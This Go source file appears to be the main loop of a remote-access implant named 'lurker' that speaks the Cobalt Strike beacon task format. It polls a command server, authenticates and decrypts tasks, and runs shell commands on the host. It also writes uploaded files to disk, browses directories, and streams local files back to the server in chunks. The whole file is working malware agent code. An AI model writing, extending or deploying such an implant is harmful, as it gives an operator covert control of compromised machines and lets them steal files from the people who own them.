package main

import (
	"bytes"
	"crypto/hmac"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"lurker/lurker/commands"
	"lurker/lurker/constants"
	"lurker/lurker/cryptography"
	"lurker/lurker/transports"
	"lurker/lurker/utilities"
)

func main() {

	ok := transports.InitialCallback()
	if ok {
		for {
			resp := transports.PullCommand()
			if resp != nil {
				if err := processResponse(resp); err != nil {
					fmt.Printf("!error processing response: %v\n", err)
				}
			}
			time.Sleep(constants.SleepTime)
		}
	}
}

func processResponse(resp *http.Response) error {
	bodybytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("reading response body: %w", err)
	}
	decoded_body, err := base64.RawURLEncoding.DecodeString(string(bodybytes))
	if err != nil {
		return fmt.Errorf("base64 decoding: %w", err)
	}
	totalLen := len(decoded_body)
	if totalLen <= cryptography.HmacHashLen {
		return nil // empty or too short — no tasks
	}

	// HMAC verification
	ciphertext := decoded_body[:totalLen-cryptography.HmacHashLen]
	receivedHmac := decoded_body[totalLen-cryptography.HmacHashLen:]
	expectedHmac := cryptography.HmacHash(ciphertext)
	if !hmac.Equal(receivedHmac, expectedHmac) {
		return fmt.Errorf("HMAC verification failed")
	}

	decrypted, err := transports.DecryptPacket(ciphertext)
	if err != nil {
		return fmt.Errorf("decryption: %w", err)
	}
	if len(decrypted) < 8 {
		return fmt.Errorf("decrypted data too short: %d bytes", len(decrypted))
	}

	lenBytes := decrypted[4:8]
	transportsLen := transports.ReadInt(lenBytes)
	if transportsLen == 0 {
		return nil // no task data
	}

	taskData := decrypted[8:]

	// Auto-detect CS 4.9 vs 4.12 task format
	taskHeaderLen := transports.DetectTaskHeaderLen(taskData, transportsLen)

	decryptedBuf := bytes.NewBuffer(taskData)
	for {
		if transportsLen <= 0 {
			break
		}
		cmdType, cmdBuf, err := transports.ParsePacket(decryptedBuf, &transportsLen, taskHeaderLen)
		if err != nil {
			return fmt.Errorf("parsing packet: %w", err)
		}
		if cmdBuf != nil {
			executeCommand(cmdType, cmdBuf)
		}
	}
	return nil
}

func executeCommand(cmdType uint32, cmdBuf []byte) {
	switch cmdType {
	case commands.CMD_TYPE_SHELL:
		shellPath, shellBuf := commands.ParseCommandShell(cmdBuf)
		result := commands.Shell(shellPath, shellBuf)
		finalPacket := transports.MakePacket(0, result)
		transports.PushResult(finalPacket)

	case commands.CMD_TYPE_UPLOAD_START:
		filePath, fileData := commands.ParseCommandUpload(cmdBuf)
		filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
		commands.Upload(filePathStr, fileData)

	case commands.CMD_TYPE_UPLOAD_LOOP:
		filePath, fileData := commands.ParseCommandUpload(cmdBuf)
		filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
		commands.Upload(filePathStr, fileData)

	case commands.CMD_TYPE_DOWNLOAD:
		filePath := cmdBuf
		strFilePath := string(filePath)
		strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
		fileInfo, err := os.Stat(strFilePath)
		if err != nil {
			return
		}
		fileLen := fileInfo.Size()
		test := int(fileLen)
		fileLenBytes := transports.WriteInt(test)
		requestID := cryptography.RandomInt(10000, 99999)
		requestIDBytes := transports.WriteInt(requestID)
		result := utilities.BytesCombine(requestIDBytes, fileLenBytes, filePath)
		finalPaket := transports.MakePacket(2, result)
		transports.PushResult(finalPaket)

		fileHandle, err := os.Open(strFilePath)
		if err != nil {
			return
		}
		defer fileHandle.Close()
		var fileContent []byte
		fileBuf := make([]byte, 512*1024)
		for {
			n, err := fileHandle.Read(fileBuf)
			if err != nil && err != io.EOF {
				break
			}
			if n == 0 {
				break
			}
			fileContent = fileBuf[:n]
			result = utilities.BytesCombine(requestIDBytes, fileContent)
			finalPaket = transports.MakePacket(8, result)
			transports.PushResult(finalPaket)
		}

		finalPaket = transports.MakePacket(9, requestIDBytes)
		transports.PushResult(finalPaket)

	case commands.CMD_TYPE_FILE_BROWSE:
		dirResult := commands.File_Browse(cmdBuf)
		finalPacket := transports.MakePacket(22, dirResult)
		transports.PushResult(finalPacket)

	case commands.CMD_TYPE_CD:
		commands.ChangeCurrentDir(cmdBuf)

	case commands.CMD_TYPE_SLEEP:
		sleep := transports.ReadInt(cmdBuf[:4])
		constants.SleepTime = time.Duration(sleep) * time.Millisecond

	case commands.CMD_TYPE_PWD:
		pwdResult := commands.GetCurrentDirectory()
		finPacket := transports.MakePacket(19, pwdResult)
		transports.PushResult(finPacket)

	case commands.CMD_TYPE_EXIT:
		os.Exit(0)

	default:
		errIdBytes := transports.WriteInt(0)
		arg1Bytes := transports.WriteInt(0)
		arg2Bytes := transports.WriteInt(0)
		errMsgBytes := []byte("")
		result := utilities.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
		finalPacket := transports.MakePacket(31, result)
		transports.PushResult(finalPacket)
	}
}
